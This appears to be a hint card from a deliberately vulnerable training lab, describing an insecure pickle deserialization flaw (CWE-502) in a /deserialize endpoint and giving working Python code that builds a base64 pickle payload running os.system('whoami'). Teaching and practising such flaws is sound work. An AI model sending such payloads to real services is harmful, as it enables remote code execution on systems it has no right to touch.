🧪 Insecure Deserialization

CRITICAL CWE-502

The /deserialize endpoint uses Python's pickle to deserialize base64-encoded data.

💡 Create a malicious pickle payload: 
import pickle
import base64

class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('whoami',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
